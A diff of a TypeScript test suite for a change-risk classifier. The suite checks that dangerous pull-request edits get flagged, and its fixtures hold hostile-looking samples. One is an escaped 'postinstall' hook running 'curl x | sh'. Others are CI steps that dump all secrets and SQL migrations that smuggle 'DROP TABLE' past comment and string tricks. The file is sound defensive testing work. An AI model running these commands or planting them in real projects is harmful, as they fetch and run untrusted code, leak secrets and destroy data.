@@ -92,6 +92,7 @@ describe("classify", () => {
         ["sidecar/package.json", '    "prepare": "bun run build",'],
         ["package.json", '  "trustedDependencies": ["esbuild"],'],
         ["package.json", '    "verify:report": "bun run evil.ts",'],
+        ["package.json", '    "\\u0070ostinstall": "curl x | sh",'],
         ["package.json", null],
         ["bun.lock", '    "zod": ["zod@4.6.7", "https://mirror.example/zod.tgz", {}, "sha512"],'],
         ["src-tauri/Cargo.lock", 'source = "git+https://example.com/foo#abc"'],
@@ -105,6 +106,10 @@ describe("classify", () => {
 
   it("keeps what the verify workflows install and run with high", () => {
     for (const path of [
+      "scripts/node_modules/zod/index.js",
+      "scripts/tsconfig.json",
+      "src/lib/package.json",
+      "node_modules/zod/index.js",
       "bunfig.toml",
       "tsconfig.json",
       ".npmrc",
@@ -117,6 +122,13 @@ describe("classify", () => {
   it("keeps CI that reaches secrets, write tokens or privileged triggers high", () => {
     for (const text of [
       "        run: echo ${{ secrets.TOKEN }}",
+      "        run: echo '${{ toJSON(secrets) }}'",
+      "        key: ${{ secrets[format('YARVIS_{0}_PRIVATE_KEY', 'BOT')] }}",
+      '      contents: "write"',
+      'name: "CI"',
+      "  push:",
+      "  schedule:",
+      "  workflow_dispatch:",
       "  pull_request_target:",
       "  issue_comment:",
       "      contents: write",
@@ -198,6 +210,18 @@ CREATE INDEX "things_kind_idx" ON "things" USING btree ("kind");`;
         'CREATE EXTENSION IF NOT EXISTS "dblink";',
         'CREATE TABLE "a" ("x" int) /* ; DROP TABLE "memories" */;',
         "",
+        // A `--` inside a string or a name is not a comment to Postgres.
+        `CREATE TABLE "a" ("x" text DEFAULT '--'); DROP TABLE memories;`,
+        'CREATE TABLE "a--" ("x" int); DROP TABLE memories;',
+        'CREATE TABLE "a" AS TABLE "memories";',
+        'CREATE TABLE "a" (LIKE "memories");',
+        'CREATE TABLE "a" ("x" int) INHERITS ("memories");',
+        'CREATE TABLE "a" PARTITION OF "events" FOR VALUES IN (1);',
+        'ALTER TABLE "t" ADD COLUMN "x" int DEFAULT pg_terminate_backend(1)::int;',
+        'ALTER TABLE "t" ADD COLUMN "DEFAULT" text NOT NULL;',
+        'ALTER TABLE "t" ADD COLUMN "x" text UNIQUE;',
+        'ALTER TABLE "t" ADD COLUMN "x" int CHECK (x > 0);',
+        'CREATE INDEX "i" ON "t" USING btree (lower("x"));',
       ]) {
         expect(classify([migration(sql)]).assess).toHaveLength(1);
       }
@@ -207,22 +231,58 @@ CREATE INDEX "things_kind_idx" ON "things" USING btree ("kind");`;
       expect(classify([migration('CREATE INDEX "a" ON "b" ("c");', 1)]).assess).toHaveLength(1);
     });
 
-    it("treats drizzle's snapshots and an appended journal entry as standard", () => {
-      for (const path of [
-        "sidecar/drizzle/meta/0050_snapshot.json",
-        "sidecar/drizzle/meta/_journal.json",
-      ]) {
-        expect(classify([file(path, 7, 1)])).toMatchObject({ tier: "standard", assess: [] });
-      }
+    it("treats drizzle's snapshots as standard", () => {
+      expect(classify([file("sidecar/drizzle/meta/0050_snapshot.json", 900, 2)])).toMatchObject({
+        tier: "standard",
+        assess: [],
+      });
     });
 
-    it("assesses SQL outside the top level and journal edits to old entries", () => {
+    it("assesses SQL outside the top level of the migrations folder", () => {
       for (const changed of [
         file("sidecar/drizzle/meta/0050_x.sql"),
         file("sidecar/drizzle/sub/0050_x.sql"),
-        file("sidecar/drizzle/meta/_journal.json", 1, 1 + 1),
       ]) {
         expect(classify([changed]).assess).toHaveLength(1);
+      }
+    });
+
+    describe("the journal", () => {
+      const newMigration = migration('CREATE TABLE "things" ("id" int);');
+      const journal = (addedText: string, removedText: string) => ({
+        path: "sidecar/drizzle/meta/_journal.json",
+        addedText,
+        removedText,
+        additions: 7,
+        deletions: 1,
+      });
+      const entry = (tag: string) =>
+        `    },\n    {\n      "idx": 50,\n      "when": 1790000000000,\n      "tag": "${tag}",\n      "breakpoints": true\n    }`;
+      const journalAssessed = (files: ReturnType<typeof journal>[]) =>
+        classify([newMigration, ...files]).assess.map((a) => a.path);
+
+      it("is standard when it only appends this PR's additive migrations", () => {
+        expect(journalAssessed([journal(entry("0050_new"), "    }")])).toEqual([]);
+      });
+
+      it("is assessed when it edits an old entry or points at another migration", () => {
+        const edited = journal('      "when": 1790000000000,', '      "when": 1700000000000,');
+        expect(journalAssessed([edited])).toEqual(["sidecar/drizzle/meta/_journal.json"]);
+        const rerun = journal(entry("0007_old_destructive"), "    }");
+        expect(journalAssessed([rerun])).toEqual(["sidecar/drizzle/meta/_journal.json"]);
+      });
+    });
+
+    it("accepts the shapes drizzle generates", () => {
+      for (const sql of [
+        `CREATE TYPE "public"."kind" AS ENUM('a', 'b');`,
+        'ALTER TABLE "memories" ADD COLUMN "updated_at" timestamp with time zone DEFAULT now() NOT NULL;',
+        `ALTER TABLE "p" ADD COLUMN "done" jsonb DEFAULT '[]'::jsonb NOT NULL;`,
+        `ALTER TABLE "a" ADD COLUMN "approval" "tool_approval" DEFAULT 'ask' NOT NULL;`,
+        'CREATE INDEX "r" ON "agent_runs" USING btree ("kind","started_at" DESC NULLS LAST);',
+        'CREATE INDEX "m" ON "memories" USING hnsw ("embedding" vector_cosine_ops) WHERE "memories"."superseded_at" is null;',
+      ]) {
+        expect(isAdditiveMigration(sql, 0)).toBe(true);
       }
     });
 
